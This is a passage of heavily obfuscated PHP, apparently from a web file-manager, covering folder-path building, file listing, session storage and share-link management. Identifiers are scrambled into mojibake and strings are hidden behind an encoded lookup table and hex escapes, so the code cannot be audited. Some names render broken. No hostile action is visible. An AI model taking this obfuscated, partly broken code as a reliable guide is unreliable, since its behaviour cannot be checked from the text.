return $âÈŸ­; } foreach ($²“åöù— as &$½²Â»‰Õ) { $©†ğ˜ú = $½²Â»‰Õ[$€Ú†Å£‹[193]]; if ($½²Â»‰Õ[$€Ú†Å£‹[485]] == $€Ú†Å£‹[91] && $½²Â»‰Õ[$€Ú†Å£‹[192]] != 0) { $âÈŸ­[$©†ğ˜ú] = $½²Â»‰Õ[$€Ú†Å£‹[32]]; } if ($½²Â»‰Õ[$€Ú†Å£‹[485]] == $€Ú†Å£‹[91] && $½²Â»‰Õ[$€Ú†Å£‹[192]] == 0) { $âÈŸ­[$©†ğ˜ú] = $this->_listAppendPathRoot($½²Â»‰Õ, array()); } if (isset($šáçÂşÆ[$½²Â»‰Õ[$€Ú†Å£‹[584]]])) { continue; } $šáçÂşÆ[$½²Â»‰Õ[$€Ú†Å£‹[584]]] = !0; $ßØ—‘Æß = $this->parentLevelArray($½²Â»‰Õ[$€Ú†Å£‹[584]]); foreach ($ßØ—‘Æß as $³¼¡­ò¶ => $ôîèïªÈ) { if (isset($âÈŸ­[$ôîèïªÈ])) { continue; } if ($³¼¡­ò¶ == 0) { $âÈŸ­[$ôîèïªÈ] = $this->_listAppendPathRoot($½²Â»‰Õ, $ßØ—‘Æß); } if ($³¼¡­ò¶ != 0) { $ÕÖÑªî¦[] = $ôîèïªÈ; } } } unset($½²Â»‰Õ); $ÕÖÑªî¦ = array_unique($ÕÖÑªî¦); if (count($ÕÖÑªî¦) > 0) { $¥Ñ¨¡èã = array($€Ú†Å£‹[491] => array($€Ú†Å£‹[492], $ÕÖÑªî¦)); if (count($ÕÖÑªî¦) == 1) { $ø„š«¬ = $this->sourceInfo($ÕÖÑªî¦[0]); $ğï£³Û• = is_array($ø„š«¬) ? array($ø„š«¬) : !1; } else { $ğï£³Û• = $this->field($€Ú†Å£‹[591])->where($¥Ñ¨¡èã)->select(); } if (!$ğï£³Û•) { $ğï£³Û• = array(); } foreach ($ğï£³Û• as $¸îì¨ĞÁ) { $âÈŸ­[$¸îì¨ĞÁ[$€Ú†Å£‹[193]]] = $¸îì¨ĞÁ[$€Ú†Å£‹[32]]; } } $‘†“ú” = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $«·âÛ… = array(); foreach ($²“åöù— as &$½²Â»‰Õ) { $Š¸¸êŸ = $½²Â»‰Õ[$€Ú†Å£‹[584]]; $û”Æ‚¹ş = $€Ú†Å£‹[12]; if (isset($«·âÛ…[$Š¸¸êŸ])) { $û”Æ‚¹ş = $«·âÛ…[$Š¸¸êŸ]; } else { $ßØ—‘Æß = $this->parentLevelArray($½²Â»‰Õ[$€Ú†Å£‹[584]]); foreach ($ßØ—‘Æß as $³¼¡­ò¶ => $ôîèïªÈ) { if (isset($âÈŸ­[$ôîèïªÈ])) { $û”Æ‚¹ş .= $âÈŸ­[$ôîèïªÈ] . $€Ú†Å£‹[8]; } } $«·âÛ…[$Š¸¸êŸ] = $û”Æ‚¹ş; } $û”Æ‚¹ş .= $½²Â»‰Õ[$€Ú†Å£‹[32]]; if ($½²Â»‰Õ[$€Ú†Å£‹[485]] == $€Ú†Å£‹[91]) { $û”Æ‚¹ş .= $€Ú†Å£‹[8]; } $½²Â»‰Õ[$€Ú†Å£‹[582]] = str_replace($€Ú†Å£‹[592], $€Ú†Å£‹[8], $û”Æ‚¹ş); if ($½²Â»‰Õ[$€Ú†Å£‹[192]] == $€Ú†Å£‹[228]) { $½²Â»‰Õ[$€Ú†Å£‹[32]] = trim($âÈŸ­[$½²Â»‰Õ[$€Ú†Å£‹[193]]], $€Ú†Å£‹[8]); $½²Â»‰Õ[$€Ú†Å£‹[582]] = $½²Â»‰Õ[$€Ú†Å£‹[32]] . $€Ú†Å£‹[8]; } if (intval($½²Â»‰Õ[$€Ú†Å£‹[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($½²Â»‰Õ, $ßØ—‘Æß, $‘†“ú”); } } unset($½²Â»‰Õ); return $²“åöù—; } private function _listAppendPathRecycle(&$Ì¯áöÌ¬, $ßŠÌ†”Ø, $Àûò˜Ú) { $…±ÃÅ¦¤ =& $_SERVER[ˆ¡¹µ‹Â]; if (!in_array($Àûò˜Ú, $ßŠÌ†”Ø) && $Ì¯áöÌ¬[$…±ÃÅ¦¤[193]] != $Àûò˜Ú) { return; } $£µÇ = explode($…±ÃÅ¦¤[8], trim($Ì¯áöÌ¬[$…±ÃÅ¦¤[582]], $…±ÃÅ¦¤[8])); $üí‡•ê‚ = implode($…±ÃÅ¦¤[8], array_slice($£µÇ, 2)); $Ì¯áöÌ¬[$…±ÃÅ¦¤[582]] = $…±ÃÅ¦¤[8] . LNG($…±ÃÅ¦¤[593]) . $…±ÃÅ¦¤[8] . ltrim($üí‡•ê‚, $…±ÃÅ¦¤[8]); $Ì¯áöÌ¬[$…±ÃÅ¦¤[584]] = $…±ÃÅ¦¤[594] . implode($…±ÃÅ¦¤[50], array_slice($ßŠÌ†”Ø, 1)) . $…±ÃÅ¦¤[50]; if ($Ì¯áöÌ¬[$…±ÃÅ¦¤[193]] == $Àûò˜Ú) { $Ì¯áöÌ¬[$…±ÃÅ¦¤[584]] = $…±ÃÅ¦¤[594]; $Ì¯áöÌ¬[$…±ÃÅ¦¤[192]] = $…±ÃÅ¦¤[228]; $Ì¯áöÌ¬[$…±ÃÅ¦¤[32]] = LNG($…±ÃÅ¦¤[593]); } $Ì¯áöÌ¬[$…±ÃÅ¦¤[595]] = $…±ÃÅ¦¤[596]; } protected function _listAppendPathRoot(&$“­ßî, $¬”»–„) { $˜Ø­¤Àú =& $_SERVER[ˆ¡¹µ‹Â]; static $“—ˆúª§ = false; $°Åæ¡¥¥ = $˜Ø­¤Àú[12]; if ($“­ßî[$˜Ø­¤Àú[190]] == self::TYPE_USER) { if ($“­ßî[$˜Ø­¤Àú[569]] == USER_ID) { $°Åæ¡¥¥ = LNG($˜Ø­¤Àú[597]); if ($“—ˆúª§ === !1) { $öÑ¤… = Model($˜Ø­¤Àú[598])->getInfoFull(USER_ID); $“—ˆúª§ = _get($öÑ¤…, $˜Ø­¤Àú[599], $˜Ø­¤Àú[12]); } if ($¬”»–„ && $¬”»–„[0] == $“—ˆúª§ || !$¬”»–„ && $“­ßî[$˜Ø­¤Àú[193]] == $“—ˆúª§) { $°Åæ¡¥¥ = LNG($˜Ø­¤Àú[600]); $“­ßî[$˜Ø­¤Àú[601]] = $˜Ø­¤Àú[602]; } if (!$¬”»–„) { $“­ßî[$˜Ø­¤Àú[32]] = $°Åæ¡¥¥; } } else { $“­ßî[$˜Ø­¤Àú[603]] = Model($˜Ø­¤Àú[577])->getInfoSimpleOuter($“­ßî[$˜Ø­¤Àú[569]]); $°Åæ¡¥¥ = LNG($˜Ø­¤Àú[604]) . $˜Ø­¤Àú[176] . $“­ßî[$˜Ø­¤Àú[603]][$˜Ø­¤Àú[32]] . $˜Ø­¤Àú[178]; } } else { if ($“­ßî[$˜Ø­¤Àú[190]] == self::TYPE_GROUP) { $Ã§§Á„ = Model($˜Ø­¤Àú[585])->getInfoSimple($“­ßî[$˜Ø­¤Àú[569]]); $°Åæ¡¥¥ = $Ã§§Á„[$˜Ø­¤Àú[32]]; } else { if ($“­ßî[$˜Ø­¤Àú[190]] == self::TYPE_SYSTEM) { $°Åæ¡¥¥ = $˜Ø­¤Àú[605]; } } } $°Åæ¡¥¥ = $°Åæ¡¥¥ ? $˜Ø­¤Àú[8] . $°Åæ¡¥¥ . $˜Ø­¤Àú[8] : $˜Ø­¤Àú[8]; return $°Åæ¡¥¥; } protected function _listAppendUser(&$•ª™ùóĞ) { $ŸøÒ¶ŞÕ =& $_SERVER[ˆ¡¹µ‹Â]; $ê‘É½éÇ = array_to_keyvalue($•ª™ùóĞ, $ŸøÒ¶ŞÕ[12], $ŸøÒ¶ŞÕ[527]); $À¤Æ•ìÁ = array_to_keyvalue($•ª™ùóĞ, $ŸøÒ¶ŞÕ[12], $ŸøÒ¶ŞÕ[529]); $òÈâ´Ú = array_merge($ê‘É½éÇ, $À¤Æ•ìÁ); $ØĞÈü = Model($ŸøÒ¶ŞÕ[598])->userListInfo($òÈâ´Ú); foreach ($•ª™ùóĞ as &$¿İ´íŞŸ) { $¿ú–Íµß = $¿İ´íŞŸ[$ŸøÒ¶ŞÕ[527]]; $¿İ´íŞŸ[$ŸøÒ¶ŞÕ[527]] = $ØĞÈü[$¿ú–Íµß] ? $ØĞÈü[$¿ú–Íµß] : !1; $¿ú–Íµß = $¿İ´íŞŸ[$ŸøÒ¶ŞÕ[529]]; $¿İ´íŞŸ[$ŸøÒ¶ŞÕ[529]] = $ØĞÈü[$¿ú–Íµß] ? $ØĞÈü[$¿ú–Íµß] : !1; if (_get($¿İ´íŞŸ, $ŸøÒ¶ŞÕ[606], 0)) { $…ê†½Â­ = $GLOBALS[$ŸøÒ¶ŞÕ[6]][$ŸøÒ¶ŞÕ[92]][$ŸøÒ¶ŞÕ[607]]; if ($¿İ´íŞŸ[$ŸøÒ¶ŞÕ[539]][$ŸøÒ¶ŞÕ[608]] <= time() - $…ê†½Â­) { $this->metaSet($¿İ´íŞŸ[$ŸøÒ¶ŞÕ[193]], $ŸøÒ¶ŞÕ[609], null); $this->metaSet($¿İ´íŞŸ[$ŸøÒ¶ŞÕ[193]], $ŸøÒ¶ŞÕ[608], null); unset($¿İ´íŞŸ[$ŸøÒ¶ŞÕ[539]][$ŸøÒ¶ŞÕ[609]]); continue; } $‰í±«°¿ = $¿İ´íŞŸ[$ŸøÒ¶ŞÕ[539]][$ŸøÒ¶ŞÕ[609]]; $¿İ´íŞŸ[$ŸøÒ¶ŞÕ[539]][$ŸøÒ¶ŞÕ[610]] = Model($ŸøÒ¶ŞÕ[598])->getInfoSimpleOuter($‰í±«°¿); } } unset($¿İ´íŞŸ); } public function parentLevelArray($â’öØÜ) { $µ•·³ =& $_SERVER[ˆ¡¹µ‹Â]; $â’öØÜ = explode($µ•·³[50], trim($â’öØÜ, $µ•·³[50])); return array_remove_value($â’öØÜ, $µ•·³[228]); } public function listAll($Á´Â„) { $øé™ßİ =& $_SERVER[ˆ¡¹µ‹Â]; $ Ñá¹—£ = $this->sourceInfo($Á´Â„); $‹—ÉîÙ± = array($øé™ßİ[611] => array($øé™ßİ[612], $ Ñá¹—£[$øé™ßİ[584]] . $Á´Â„ . $øé™ßİ[613]), $øé™ßİ[614] => 0); $ï©ë¶Ö¼ = $øé™ßİ[615]; $à·È¿‹ = "\x4c\x45\106\124\40\x4a\117\x49\x4e\40{$this->tablePrefix}\x69\x6f\x5f\x66\x69\x6c\x65\40\146\151\x6c\x65\x20\x6f\156\40\163\157\x75\x72\x63\x65\x2e\146\151\154\x65\111\104\40\75\40\146\151\154\145\x2e\146\151\154\x65\x49\104"; $ ©ÜûÏ£ = $this->alias($øé™ßİ[519])->field($ï©ë¶Ö¼)->where($‹—ÉîÙ±)->join($à·È¿‹)->select(); $this->_listAppendAuth($ ©ÜûÏ£); $this->_listAppendUser($ ©ÜûÏ£); $this->_listAppendPath($ ©ÜûÏ£); $ ©ÜûÏ£ = array_to_keyvalue($ ©ÜûÏ£, $øé™ßİ[193]); $ÛšœÈÜÃ = "\57{$ Ñá¹—£[$øé™ßİ[32]]}\57"; $ÛšœÈÜÃ = $ÛšœÈÜÃ == $øé™ßİ[592] ? $øé™ßİ[8] : $ÛšœÈÜÃ; $õæíİõ¸ = array(); foreach ($ ©ÜûÏ£ as $Æû½¥éè => $ßÅ°Ş) { $Ì¥Éôëá = $this->parentLevelArray($ßÅ°Ş[$øé™ßİ[584]]); array_shift($Ì¥Éôëá); $‡‡Ûø²´ = $ÛšœÈÜÃ; for ($‰ğ°¾…ù = 0; $‰ğ°¾…ù < count($Ì¥Éôëá); $‰ğ°¾…ù++) { $‡‡Ûø²´ .= $ ©ÜûÏ£[$Ì¥Éôëá[$‰ğ°¾…ù]][$øé™ßİ[32]] . $øé™ßİ[8]; } $‡‡Ûø²´ .= $ßÅ°Ş[$øé™ßİ[32]]; if ($ßÅ°Ş[$øé™ßİ[485]]) { $‡‡Ûø²´ .= $øé™ßİ[8]; } $¦ş•£– = array($øé™ßİ[495] => str_replace($øé™ßİ[592], $øé™ßİ[8], str_replace($øé™ßİ[592], $øé™ßİ[8], str_replace($øé™ßİ[592], $øé™ßİ[8], $‡‡Ûø²´))), $øé™ßİ[616] => intval($ßÅ°Ş[$øé™ßİ[485]]), $øé™ßİ[617] => intval($ßÅ°Ş[$øé™ßİ[79]]), $øé™ßİ[88] => intval($ßÅ°Ş[$øé™ßİ[88]]), $øé™ßİ[90] => $this->pathInfoFilter($ßÅ°Ş)); if (!$¦ş•£–[$øé™ßİ[485]]) { $¦ş•£–[$øé™ßİ[541]] = $ßÅ°Ş[$øé™ßİ[541]]; } $õæíİõ¸[] = $¦ş•£–; } $õæíİõ¸ = array_sort_by($õæíİõ¸, $øé™ßİ[87]); return $õæíİõ¸; } } goto B©â¥È¥Ï; a¶„ÉÉçÉ˜: class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\x65\155\x5f\x73\x65\163\x73\151\x6f\156"; public function get($¬€€¢§û) { $¯ë›ùá =& $_SERVER[ˆ¡¹µ‹Â]; $İ¾¤…ó÷ = $this->where(array($¯ë›ùá[2102] => $¬€€¢§û))->find(); if (!is_array($İ¾¤…ó÷)) { return !1; } return $İ¾¤…ó÷[$¯ë›ùá[171]]; } public function set($—Ùëú¸, $‹…ø¥Ÿ, $æ¼÷ £ = 3600) { $Î÷—‡ë =& $_SERVER[ˆ¡¹µ‹Â]; $±ÄÃå = array($Î÷—‡ë[2102] => $—Ùëú¸, $Î÷—‡ë[2001] => $‹…ø¥Ÿ, $Î÷—‡ë[2103] => $æ¼÷ £ + time()); if (Session::get($Î÷—‡ë[2104])) { $±ÄÃå[$Î÷—‡ë[1763]] = Session::get($Î÷—‡ë[2104]); } else { $±ÄÃå[$Î÷—‡ë[1763]] = 0; } if ($this->get($—Ùëú¸)) { return $this->where(array($Î÷—‡ë[2102] => $—Ùëú¸))->save($±ÄÃå); } else { return $this->add($±ÄÃå, array(), !0); } } public function remove($ò¦Š¦ÈÛ) { return $this->where(array($_SERVER[ˆ¡¹µ‹Â][2102] => $ò¦Š¦ÈÛ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ˆ¡¹µ‹Â][2105] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\141\162\145"; protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\124\x69\155\x65", "\164\151\x6d\145", "\x69\156\x73\145\x72\164\54\165\x70\x64\141\x74\145", "\146\x75\x6e\x63\164\151\157\x6e"), array("\143\162\x65\141\x74\x65\x54\151\x6d\145", "\x74\151\x6d\x65", "\x69\156\163\x65\162\164", "\x66\x75\156\x63\x74\151\157\x6e"), array("\x6f\160\x74\151\157\156\163", '', "\151\156\163\x65\162\164\54\165\160\144\x61\x74\x65\54\x73\x65\x6c\145\143\164", "\x6a\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($££¤÷í«) { $„•ºÃ˜÷ =& $_SERVER[ˆ¡¹µ‹Â]; $ÒŸ›Ô¾ı = isset($££¤÷í«[0]) ? $££¤÷í«[0] : !1; return array($„•ºÃ˜÷[2106] => array(USER_ID, $„•ºÃ˜÷[2107]), $„•ºÃ˜÷[2046] => array($ÒŸ›Ô¾ı, $„•ºÃ˜÷[2108])); } protected function listSimple() { $³©„©ä = array($_SERVER[ˆ¡¹µ‹Â][1763] => USER_ID); $ÇÑºâíÌ = $this->field($this->fieldList)->where($³©„©ä)->select(); return $ÇÑºâíÌ ? $ÇÑºâíÌ : array(); } protected function getInfo($ğ¯Şºµ, $›Í¶æê¥ = false) { $à¹‹ÏÍ  =& $_SERVER[ˆ¡¹µ‹Â]; if ($›Í¶æê¥) { return $this->_getShareInfo(array($à¹‹ÏÍ [665] => $ğ¯Şºµ)); } $À–¤‚‚Å = $this->cacheFunctionGet($à¹‹ÏÍ [2048], $ğ¯Şºµ); return $À–¤‚‚Å; } public function getInfoByHash($»œãıÕ©) { return $this->_getShareInfo(array($_SERVER[ˆ¡¹µ‹Â][2109] => $»œãıÕ©)); } public function getInfoByPath($­ŠïâµÚ) { $šü–Úè› =& $_SERVER[ˆ¡¹µ‹Â]; $÷ßË¢ø¨ = array($šü–Úè›[1763] => USER_ID, $šü–Úè›[193] => $­ŠïâµÚ); return $this->_getShareInfo($÷ßË¢ø¨); } public function getInfoBySourcePath($œ›‰»ë) { $¿¥‰ä® =& $_SERVER[ˆ¡¹µ‹Â]; $æÂ©Á¹ = array($¿¥‰ä®[1763] => USER_ID, $¿¥‰ä®[1250] => $œ›‰»ë); return $this->_getShareInfo($æÂ©Á¹); } private function _getShareInfo($™Œ¹‚ã¦) { $ƒª¼ìæ’ =& $_SERVER[ˆ¡¹µ‹Â]; $øŠ½óıù = $this->where($™Œ¹‚ã¦)->find(); if (!$øŠ½óıù) { return !1; } $™Œ¹‚ã¦ = array($ƒª¼ìæ’[665] => $øŠ½óıù[$ƒª¼ìæ’[665]]); $İŒÜÄùô = $ƒª¼ìæ’[2110]; $×²…®—„ = Model($ƒª¼ìæ’[666])->order($ƒª¼ìæ’[475])->field($İŒÜÄùô)->where($™Œ¹‚ã¦)->select(); if ($øŠ½óıù[$ƒª¼ìæ’[193]] == $ƒª¼ìæ’[228]) { $øŠ½óıù[$ƒª¼ìæ’[90]] = IO::info($øŠ½óıù[$ƒª¼ìæ’[1250]]); } else { $øŠ½óıù[$ƒª¼ìæ’[90]] = Model($ƒª¼ìæ’[1411])->pathInfo($øŠ½óıù[$ƒª¼ìæ’[193]]); } $øŠ½óıù[$ƒª¼ìæ’[2111]] = $×²…®—„; return $øŠ½óıù; } protected function getInfoAuth($úâ¸½“) { $ºšó•¹Œ =& $_SERVER[ˆ¡¹µ‹Â]; $¾õÎáò = $this->getInfo($úâ¸½“); if ($¾õÎáò[$ºšó•¹Œ[1763]] == USER_ID) { $¾õÎáò[$ºšó•¹Œ[487]] = $¾õÎáò[$ºšó•¹Œ[90]][$ºšó•¹Œ[487]]; } else { $¾õÎáò[$ºšó•¹Œ[487]] = Model($ºšó•¹Œ[567])->authMake($¾õÎáò[$ºšó•¹Œ[2111]]); } return $¾õÎáò; } protected function listData($Û¡·è˜¥ = null, $ùĞ‚¦…Õ = 300) { $Ò¥•¯¾¹ =& $_SERVER[ˆ¡¹µ‹Â]; $ÉáŸ©şÄ = array(array($Ò¥•¯¾¹[562] => array($Ò¥•¯¾¹[1083], 0), $Ò¥•¯¾¹[663] => array($Ò¥•¯¾¹[1083], 0), $Ò¥•¯¾¹[2112] => $Ò¥•¯¾¹[2064])); if ($Û¡·è˜¥ == $Ò¥•¯¾¹[2113]) { $ÉáŸ©şÄ = array($Ò¥•¯¾¹[562] => 1); } else { if ($Û¡·è˜¥ == $Ò¥•¯¾¹[1235]) { $ÉáŸ©şÄ = array($Ò¥•¯¾¹[663] => 1); } } $ÉáŸ©şÄ[$Ò¥•¯¾¹[1763]] = USER_ID; $‚˜ä…“Ü = $this->where($ÉáŸ©şÄ)->selectPage($ùĞ‚¦…Õ); return $‚˜ä…“Ü; } protected function listToMe($äÎı²Î = 300) { $Ö›ı‡‘ =& $_SERVER[ˆ¡¹µ‹Â]; $ıÙÏÏ® = Model($Ö›ı‡‘[2114])->userGroupParents(USER_ID); $ÆÃÔ¥‡Ê = array($Ö›ı‡‘[648] => SourceModel::TYPE_USER, $Ö›ı‡‘[569] => USER_ID); if ($ıÙÏÏ®) { $ÆÃÔ¥‡Ê = array(array($Ö›ı‡‘[648] => SourceModel::TYPE_USER, $Ö›ı‡‘[569] => USER_ID), array($Ö›ı‡‘[648] => SourceModel::TYPE_GROUP, $Ö›ı‡‘[569] => array($Ö›ı‡‘[7], $ıÙÏÏ®)), $Ö›ı‡‘[2112] => $Ö›ı‡‘[2064]); } $±Í‘¢â˜ = Model($Ö›ı‡‘[666])->where($ÆÃÔ¥‡Ê)->selectPage($äÎı²Î); $ğÖğåç¸ = array_to_keyvalue_group($±Í‘¢â˜[$Ö›ı‡‘[445]], $Ö›ı‡‘[665]); if (!$ğÖğåç¸) { return $±Í‘¢â˜; } $ş…Ì·”õ = $Ö›ı‡‘[2115]; $ÆÃÔ¥‡Ê = array($Ö›ı‡‘[665] => array($Ö›ı‡‘[492], array_keys($ğÖğåç¸)), $Ö›ı‡‘[1763] => array($Ö›ı‡‘[1085], $Ö›ı‡‘[228])); $½ë€‹ßÒ = $this->field($ş…Ì·”õ)->where($ÆÃÔ¥‡Ê)->select(); foreach ($½ë€‹ßÒ as $«š¢¸ì¥ => &$øøõó‰€) { $øøõó‰€[$Ö›ı‡‘[2111]] = $ğÖğåç¸[$øøõó‰€[$Ö›ı‡‘[665]]]; } unset($øøõó‰€); $Ş¡ù•Ş’ = array($Ö›ı‡‘[2116] => $½ë€‹ßÒ, $Ö›ı‡‘[2117] => $±Í‘¢â˜[$Ö›ı‡‘[442]]); return $Ş¡ù•Ş’; } protected function shareAdd($ÑáˆÛ¼Á, $”â˜ò²î) { $ôÖ‚‘ı¡ =& $_SERVER[ˆ¡¹µ‹Â]; $‹˜ã‘ÁÉ = $this->_addShareData($ÑáˆÛ¼Á, $”â˜ò²î); if (!empty($”â˜ò²î[$ôÖ‚‘ı¡[2118]])) { $this->_shareAuthSet($‹˜ã‘ÁÉ, $”â˜ò²î[$ôÖ‚‘ı¡[2118]]); } $this->shareEventAdd($ÑáˆÛ¼Á, $”â˜ò²î, $ôÖ‚‘ı¡[2119]); return $‹˜ã‘ÁÉ; } protected function shareAddSystem($ªÆ´àæ, $ä™‚‚á§) { $ÌáÊ¬¿ç =& $_SERVER[ˆ¡¹µ‹Â]; $ìÌéÊãÎ = $this->_addShareData($ªÆ´àæ, $ä™‚‚á§, $ÌáÊ¬¿ç[191]); $this->_shareAuthSet($ìÌéÊãÎ, $ä™‚‚á§[$ÌáÊ¬¿ç[2118]]); return $ìÌéÊãÎ; } private function shareEventAdd($ß‘ Ãş, $¨ÉÅº«, $ŒÉĞßÄ = "\141\x64\144") { $ê«æ‡£¸ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$ß‘ Ãş || $ß‘ Ãş == $ê«æ‡£¸[228]) { return; } if ($ŒÉĞßÄ == $ê«æ‡£¸[2119]) { if ($¨ÉÅº«[$ê«æ‡£¸[562]] == $ê«æ‡£¸[91]) { Model($ê«æ‡£¸[633])->eventShare($ß‘ Ãş, $ê«æ‡£¸[2120]); } if ($¨ÉÅº«[$ê«æ‡£¸[663]] == $ê«æ‡£¸[91]) { Model($ê«æ‡£¸[633])->eventShare($ß‘ Ãş, $ê«æ‡£¸[2121]); } return; } $†È­˜ß… = $this->getInfoByPath($ß‘ Ãş); $™Üªñ€æ = $ê«æ‡£¸[2122]; if ($†È­˜ß…[$ê«æ‡£¸[562]] == $ê«æ‡£¸[228] && $¨ÉÅº«[$ê«æ‡£¸[562]] == $ê«æ‡£¸[91]) { $™Üªñ€æ = $ê«æ‡£¸[2120]; } if ($†È­˜ß…[$ê«æ‡£¸[562]] == $ê«æ‡£¸[91] && $¨ÉÅº«[$ê«æ‡£¸[562]] == $ê«æ‡£¸[228]) { $™Üªñ€æ = $ê«æ‡£¸[2123]; } if ($†È­˜ß…[$ê«æ‡£¸[663]] == $ê«æ‡£¸[228] && $¨ÉÅº«[$ê«æ‡£¸[663]] == $ê«æ‡£¸[91]) { $™Üªñ€æ = $ê«æ‡£¸[2121]; } if ($†È­˜ß…[$ê«æ‡£¸[663]] == $ê«æ‡£¸[91] && $¨ÉÅº«[$ê«æ‡£¸[663]] == $ê«æ‡£¸[228]) { $™Üªñ€æ = $ê«æ‡£¸[2124]; } Model($ê«æ‡£¸[633])->eventShare($ß‘ Ãş, $™Üªñ€æ); return; } private function _addShareData($û‘‘ŒÍî, $şâÁ¥ì = array(), $Ù€Û÷øä = false) { $ÒÅ‘ş©’ =& $_SERVER[ˆ¡¹µ‹Â]; $ê¨¦¿ùÀ = $Ù€Û÷øä == $ÒÅ‘ş©’[191] ? 0 : USER_ID; $ÌÚ‡ø³æ = array($ÒÅ‘ş©’[491] => $û‘‘ŒÍî, $ÒÅ‘ş©’[1754] => $ê¨¦¿ùÀ); if ($û‘‘ŒÍî == 0) { $ÌÚ‡ø³æ = array($ÒÅ‘ş©’[2125] => $şâÁ¥ì[$ÒÅ‘ş©’[1250]], $ÒÅ‘ş©’[1754] => $ê¨¦¿ùÀ); } if ($©“…—‡« = $this->where($ÌÚ‡ø³æ)->find()) { return $©“…—‡«[$ÒÅ‘ş©’[665]]; } if ($û‘‘ŒÍî == 0) { $˜³¶ü¥Ú = array($ÒÅ‘ş©’[32] => get_path_this($şâÁ¥ì[$ÒÅ‘ş©’[87]])); } else { $˜³¶ü¥Ú = Model($ÒÅ‘ş©’[899])->sourceInfo($û‘‘ŒÍî); if (!$˜³¶ü¥Ú) { return !1; } } if (!$şâÁ¥ì[$ÒÅ‘ş©’[1652]]) { $şâÁ¥ì[$ÒÅ‘ş©’[1652]] = $˜³¶ü¥Ú[$ÒÅ‘ş©’[32]]; } $­Œ„¿Ô¼ = array($ÒÅ‘ş©’[1754] => $ê¨¦¿ùÀ, $ÒÅ‘ş©’[491] => $û‘‘ŒÍî, $ÒÅ‘ş©’[1652] => $ÒÅ‘ş©’[12], $ÒÅ‘ş©’[562] => 0, $ÒÅ‘ş©’[663] => 0, $ÒÅ‘ş©’[1250] => $ÒÅ‘ş©’[12], $ÒÅ‘ş©’[383] => $ÒÅ‘ş©’[12], $ÒÅ‘ş©’[960] => $ÒÅ‘ş©’[12], $ÒÅ‘ş©’[2126] => 0, $ÒÅ‘ş©’[2127] => 0, $ÒÅ‘ş©’[828] => 0, $ÒÅ‘ş©’[2128] => $ÒÅ‘ş©’[12], $ÒÅ‘ş©’[2109] => $ÒÅ‘ş©’[12]); $Š…èºÉŞ = explode($ÒÅ‘ş©’[50], $ÒÅ‘ş©’[2129]); foreach ($Š…èºÉŞ as $Ò‰ë‹§ó) { if (!isset($şâÁ¥ì[$Ò‰ë‹§ó])) { continue; } $­Œ„¿Ô¼[$Ò‰ë‹§ó] = $şâÁ¥ì[$Ò‰ë‹§ó]; } $„ù„û¸Å = $this->add($­Œ„¿Ô¼); $ˆùÎÆ• = array($ÒÅ‘ş©’[2109] => short_id($„ù„û¸Å)); $this->where(array($ÒÅ‘ş©’[2130] => $„ù„û¸Å))->save($ˆùÎÆ•); return $„ù„û¸Å; } private function _shareAuthSet($¥ª¿¼¡ı, $Şı¸íˆæ) { $³Óì´©í =& $_SERVER[ˆ¡¹µ‹Â]; if (!is_array($Şı¸íˆæ)) { return !1; } $“¦œÕşæ = Model($³Óì´©í[2074]); $“¦œÕşæ->where(array($³Óì´©í[665] => $¥ª¿¼¡ı))->delete(); $¨ßğ‰ª” = array(); foreach ($Şı¸íˆæ as $ÒÜ‹ì¢ü) { $Òä¨µ = SourceModel::TYPE_USER; if ($ÒÜ‹ì¢ü[$³Óì´©í[190]] == SourceModel::TYPE_GROUP) { $Òä¨µ = SourceModel::TYPE_GROUP; } $“Ò€æ’õ = array($³Óì´©í[665] => $¥ª¿¼¡ı, $³Óì´©í[190] => $Òä¨µ, $³Óì´©í[569] => intval($ÒÜ‹ì¢ü[$³Óì´©í[569]]), $³Óì´©í[2070] => 0, $³Óì´©í[2131] => -1); if ($ÒÜ‹ì¢ü[$³Óì´©í[2070]]) { $“Ò€æ’õ[$³Óì´©í[2070]] = $ÒÜ‹ì¢ü[$³Óì´©í[2070]]; } else { if ($ÒÜ‹ì¢ü[$³Óì´©í[2131]]) { $“Ò€æ’õ[$³Óì´©í[2131]] = $ÒÜ‹ì¢ü[$³Óì´©í[2131]]; } } $¨ßğ‰ª”[] = $“Ò€æ’õ; } return $“¦œÕşæ->addAll($¨ßğ‰ª”, array(), !0); } public function numViewAdd($¤¾—Û¢ï) { $æò×ÓŞ =& $_SERVER[ˆ¡¹µ‹Â]; $ÏÀ ¯ïÜ = array($æò×ÓŞ[2130] => $¤¾—Û¢ï); $this->where($ÏÀ ¯ïÜ)->setAdd($æò×ÓŞ[2126]); } public function numDownloadAdd($‡ÕÎ¼’ç) { $íãóº‹Ç =& $_SERVER[ˆ¡¹µ‹Â]; $ŠÕå¨şÙ = array($íãóº‹Ç[2130] => $‡ÕÎ¼’ç); $this->where($ŠÕå¨şÙ)->setAdd($íãóº‹Ç[2127]); } protected function shareEdit($¡Ñ×±×Ô, $½üê¹³×) { $“ºúÏ‰€ =& $_SERVER[ˆ¡¹µ‹Â]; $ƒËˆÔãÊ = $this->getInfo($¡Ñ×±×Ô); if (!$ƒËˆÔãÊ) { return !1; } $this->_checkLinkShare($½üê¹³×, $ƒËˆÔãÊ); $õÄÍ»æì = array(); $«ŸúŒøŠ = explode($“ºúÏ‰€[50], $“ºúÏ‰€[2132]); foreach ($«ŸúŒøŠ as $˜ûôµı) { if (!array_key_exists($˜ûôµı, $½üê¹³×)) { continue; } $õÄÍ»æì[$˜ûôµı] = $½üê¹³×[$˜ûôµı]; } $this->shareEventAdd($ƒËˆÔãÊ[$“ºúÏ‰€[193]], $½üê¹³×, $“ºúÏ‰€[1931]); $this->where(array($“ºúÏ‰€[2130] => $¡Ñ×±×Ô))->save($õÄÍ»æì); if (isset($½üê¹³×[$“ºúÏ‰€[2118]])) { $this->_shareAuthSet($¡Ñ×±×Ô, $½üê¹³×[$“ºúÏ‰€[2118]]); } return !0; } private function _checkLinkShare($ç·ÙûË¹, $Ÿ·çÖÊ) { $œÈÂÙ’™ =& $_SERVER[ˆ¡¹µ‹Â]; if ($ç·ÙûË¹[$œÈÂÙ’™[562]] != $œÈÂÙ’™[91]) { return; } 